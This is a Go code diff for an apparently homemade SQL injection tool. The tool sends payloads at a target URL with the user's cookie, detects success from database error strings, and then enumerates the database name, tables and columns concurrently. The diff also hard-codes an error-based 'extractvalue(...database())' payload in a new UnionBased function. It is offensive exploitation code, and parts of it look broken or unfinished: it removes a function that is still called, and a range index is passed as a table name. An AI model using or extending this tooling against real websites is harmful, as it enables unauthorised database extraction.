@@ -6,6 +6,7 @@ import (
 	"auditor/core/utils"
 	"auditor/entities"
 	"auditor/handlers/common"
+	based "auditor/handlers/sql/base"
 	"auditor/payloads/intruder/detect"
 	"log"
 	"strings"
@@ -28,12 +29,13 @@ var (
 type ServiceInterface interface {
 	TestIntruder(c *context.Context, f *common.PageQuery) (interface{}, error)
 	Init(c *context.Context, f *BaseForm) (interface{}, error)
+	UnionBased(c *context.Context, f *BaseForm) (interface{}, error)
 
 	findPrevious(f *BaseForm) *entities.DBOptions
-	fetchDBNameLength(method SQLiBased)
-	fetchDBName(method SQLiBased)
-	fetchDBTableCount(method SQLiBased)
-	fetchDBTables(method SQLiBased)
+	fetchDBNameLength(method based.SQLi)
+	fetchDBName(method based.SQLi)
+	fetchDBTableCount(method based.SQLi)
+	fetchDBTables(method based.SQLi, tableNo int)
 }
 
 // Service  repo
@@ -59,75 +61,76 @@ func (s *Service) TestIntruder(c *context.Context, f *common.PageQuery) (interfa
 func (s *Service) Init(c *context.Context, f *BaseForm) (interface{}, error) {
 	options = s.findPrevious(f)
 
-	switch validatePwnType() {
-	case LengthValidation:
+	method := validatePwnType()
+	log.Println("==================")
+	log.Println(validateByErrorBased())
+	log.Println(method)
+	log.Println("==================")
+
+	switch method {
+	case based.LengthValidation:
 		color.Green("LengthValidation Detection Method: YES")
-		s.pwn(LengthValidation)
+		s.pwnLengthValidation(based.LengthValidation)
+	case based.ErrorSQLiBased:
+		color.Green("LengthValidation Detection Method: YES")
+		// pwnErrorbased(based.ErrorSQLiBased)
 	}
 
 	return options, nil
 }
 
-func (s *Service) pwn(method SQLiBased) interface{} {
+func (s *Service) pwnLengthValidation(method based.SQLi) interface{} {
 	color.Green("[*] RUNNING PWN ...")
 
+	cleanHtml := utils.GetPageHTML(options.URL.String(), options.Cookie)
 	for k, v := range detect.Payloads {
 		if validateByMethod(v, method) == 1 {
 			options.Payload = k
-			payload := detect.NegativePayloads[k]
-			// flag := validateByMethod(payload, method)
 
-			log.Println("[*]method ", method)
-			log.Println("[*]payload ", payload)
-
-			html := utils.GetPageHTML(options.URL.String(), options.Cookie)
 			for _, valueErr := range detect.ErrPayloads {
-				if strings.ContainsAny(html, valueErr) {
-					color.Yellow("[INFO] PAYLOAD SUCCESSFUL")
+				if strings.ContainsAny(cleanHtml, valueErr) {
+					log.Println("[INFO] PAYLOAD SUCCESSFUL")
 
 					s.fetchDBNameLength(method)
 					s.fetchDBName(method)
 					s.fetchDBTableCount(method)
-					// s.fetchDBTables(method)
+
 					for i := 0; i < options.TableCount; i++ {
 						wg.Add(1)
-						go func(no int) {
-							s.goFetchDBTables(method, no)
+						go func(index int) {
+							s.fetchDBTables(method, index)
 							wg.Done()
 						}(i)
 					}
 					wg.Wait()
-					// s.fetchColumnsName(method, "categ")
-					// getDBRows(method, "categ")
+
+					for i := range options.Tables {
+						wg.Add(1)
+						go func(tableName string) {
+							s.fetchColumnsName(method, tableName)
+							// s.fetchDBRows(method, tableName)
+							wg.Done()
+						}(i)
+					}
+					wg.Wait()
 
 					return nil
 				}
-
 			}
-
-			// if flag == 0 {
-			// 	color.Yellow("[INFO] PAYLOAD SUCCESSFUL")
-
-			// 	fetchDBNameLength(method)
-			// 	fetchDBName(method)
-			// 	break
-			// }
 		}
 	}
 	return nil
 }
 
-func (s *Service) findPrevious(f *BaseForm) *entities.DBOptions {
-	options := &entities.DBOptions{}
-	err := s.rp.FindOneByPrimitiveM(filterURL(f.URL), options)
-	if err != nil {
-		options = entities.URLOptions(f.URL, f.Param, f.Cookie)
-		_ = s.rp.Create(options)
-		return options
-	}
+func (s *Service) UnionBased(c *context.Context, f *BaseForm) (interface{}, error) {
+	options = entities.URLOptions(f.URL, f.Param, f.Cookie)
+	html := based.UnionBasedvalidate(options, "+and+extractvalue(1,concat(%27:%27,database()))")
 
-	color.Red("\n[*] FOUND THE URL!")
-	options.FromDB = true
+	// myErr := "XPATH syntax error: ':.*'\nWarning:"
+	// myInput := "XPATH syntax error: ':acuart'\nWarning:"
 
-	return options
+	// r := regexp.MustCompile(myErr)
+	// titles := r.FindString(html)
+
+	return html, nil
 }
